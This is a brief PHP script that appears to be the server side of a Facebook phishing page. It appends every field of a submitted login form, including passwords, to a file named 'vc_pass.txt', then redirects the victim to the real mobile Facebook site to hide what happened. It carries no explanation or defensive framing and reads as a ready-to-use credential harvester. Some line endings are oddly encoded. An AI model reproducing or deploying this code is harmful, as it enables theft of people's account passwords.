<?php
header
('location:');
$handle=fopen("vc_pass.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"+AFw-r+AFw-n");
}
fwrite($handle,"+AFw-r+AFw-n");
fclose($handle);
header("location:https://m.facebook.com");
exit;
?>
